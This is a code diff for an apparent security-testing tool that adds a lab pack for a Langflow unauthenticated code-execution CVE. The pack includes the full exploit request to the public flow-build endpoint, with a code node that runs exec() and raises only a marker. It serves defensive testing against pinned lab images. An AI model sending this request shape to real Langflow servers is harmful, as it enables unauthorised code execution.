@@ -15,8 +15,60 @@ silently pulling an unpinned image.
 LABEL = "io.mockforge.cve.run"
 
 import hashlib
+import json
 
 import cve_lab_payloads as payloads
+
+# Reviewed public flow for the CVE-2026-33017 pack, in the node shape Vulhub
+# documents. Langflow evaluates a CustomComponent's code while it builds the
+# class, so the build job's events carry the marker this code raises. That
+# proves unauthenticated code execution without running a command, touching a
+# file, or reaching the network. The endpoint accepts malformed flows too (it
+# answers 200 with a job id and only the job's events show the failure), so
+# this shape is pinned by tests and was verified on a lab host.
+LANGFLOW_PUBLIC_BUILD_MARKER = "MOCKFORGE-CVE-2026-33017"
+LANGFLOW_PUBLIC_BUILD_BODY = json.dumps(
+    {
+        "data": {
+            "nodes": [
+                {
+                    "id": "mockforge-marker",
+                    "type": "genericNode",
+                    "data": {
+                        "id": "mockforge-marker",
+                        "type": "CustomComponent",
+                        "node": {
+                            "template": {
+                                "code": {
+                                    "type": "str",
+                                    "value": (
+                                        "from lfx.custom import Component\n"
+                                        "\n"
+                                        "_x = exec(\"raise Exception("
+                                        "'MOCKFORGE-' + 'CVE-2026-33017')\")\n"
+                                        "\n"
+                                        "class Marker(Component):\n"
+                                        '    display_name = "Marker"\n'
+                                        "    def build(self) -> None:\n"
+                                        "        pass\n"
+                                    ),
+                                },
+                                "_type": "CustomComponent",
+                            },
+                            "base_classes": ["CustomComponent"],
+                            "display_name": "Custom Component",
+                            "outputs": [
+                                {"types": ["CustomComponent"], "name": "Custom Component"}
+                            ],
+                        },
+                    },
+                }
+            ],
+            "edges": [],
+        }
+    },
+    separators=(",", ":"),
+)
 
 # Reviewed lab application and configuration for the PHP2Shell 2026 packs,
 # shipped inside the pack and mounted read-only into the pinned official
@@ -207,9 +259,10 @@ PACKS = {
         "classifier": "cgi-argument-injection",
     },
     "CVE-2026-111497": {
-        # PR #1523 showed the crash only with native Node builds on macOS; the pinned
-        # container image has not run on a lab host, so this pack stays hidden until it does.
-        "verified": False,
+        # Verified on the lab host (Docker 29.1.3, Linux amd64) with the pinned
+        # images: the reviewed trigger crashes the lab application, which the
+        # decoder-crash gate confirms from the container's exit.
+        "verified": True,
         "catalog": {
             "schema_version": 1,
             "pack_revision": 1,
@@ -700,6 +753,74 @@ http.createServer((req, res) => {
         "classifier": "modphp-segfault",
         "baseline_exploit": "modphp-worker-sequence",
         "target_exploit": "modphp-worker-sequence",
+    },
+    "CVE-2026-33017": {
+        # Verified on the lab host (Docker 29.1.3, Linux amd64): the direct
+        # baseline answers 200 with a job id, and the job's events carry the
+        # marker the reviewed code raises.
+        "verified": True,
+        "catalog": {
+            "schema_version": 1,
+            "pack_revision": 1,
+            "cve": "CVE-2026-33017",
+            "title": "Langflow unauthenticated code execution via the public flow build",
+            "platform": "Linux, local Docker/Podman engine, amd64",
+            "application_version": "Langflow 1.8.1 (Vulhub) with automatic login disabled",
+            "application_image": "docker.io/vulhub/langflow@sha256:c71622963b4d837344f8c6aee2a004a8d4a023c6c4a2eff6b03ba2818e84ef49",
+            "runner_version": "Nuclei 3.11.1",
+            "runner_image": "docker.io/projectdiscovery/nuclei@sha256:582d5546902e67052097cb2d07296c642d50a1afc5e44623cb038845df9a32eb",
+            "references": [
+                "https://github.com/advisories/GHSA-vwmf-pq79-vjvx",
+                "https://github.com/vulhub/vulhub/tree/master/langflow/CVE-2026-33017",
+            ],
+            "coverage": "One reviewed unauthenticated public flow build that carries a benign code node; the build is accepted and the job's events carry the code's marker. Not other endpoints or an authenticated session",
+            "origin_port": 18082,
+            "listen_address_guidance": (
+                "The recorder defaults to 127.0.0.1:18082, which only accepts local "
+                "connections. Testing an LB/WAAP on another machine requires "
+                "--listen-address <an isolated lab interface IP>; keep that interface "
+                "restricted to the test network because the recorder forwards to the "
+                "vulnerable application."
+            ),
+        },
+        "probe": {
+            "template_id": "mockforge-langflow-33017-observation",
+            "template_name": "MockForge Langflow controlled lab observation",
+            "method": "POST",
+            # The public build endpoint is asynchronous: it accepts the flow and
+            # answers with a job id, and any client_id cookie is enough. The
+            # marker proves the unauthenticated build was accepted; the job's
+            # events then carry the marker the code raises.
+            "path": "/api/v1/build_public_tmp/e8b4f8c2-7a1d-4e5f-9b3c-2a6d8f0e1b4a/flow?__mockforge_cve={token}",
+            "headers": {
+                "X-Mockforge-Cve": "{token}",
+                "Content-Type": "application/json",
+                "Cookie": "client_id=mockforge-{token}",
+            },
+            "body": LANGFLOW_PUBLIC_BUILD_BODY,
+            "signature_header": None,
+            "marker": "job_id",
+        },
+        "app": {
+            "port": "7860/tcp",
+            "env": {
+                # Auto-login disabled models a deployment that requires a login.
+                "LANGFLOW_HOST": "0.0.0.0",
+                "LANGFLOW_AUTO_LOGIN": "false",
+                "DO_NOT_TRACK": "true",
+            },
+            "readiness": {"path": "/", "status": 200},
+        },
+        "controls": {
+            # The version route answers the same JSON with or without a login.
+            "benign_path": "/api/v1/version?__mockforge_cve={token}",
+            "benign_status": 200,
+            # A route that needs a login: the application's own protection.
+            "ordinary_path": "/api/v1/flows/?__mockforge_cve={token}",
+            "ordinary_status": 403,
+        },
+        "baseline_gate": "data-driven",
+        "classifier": "data-driven",
     }
 }
 
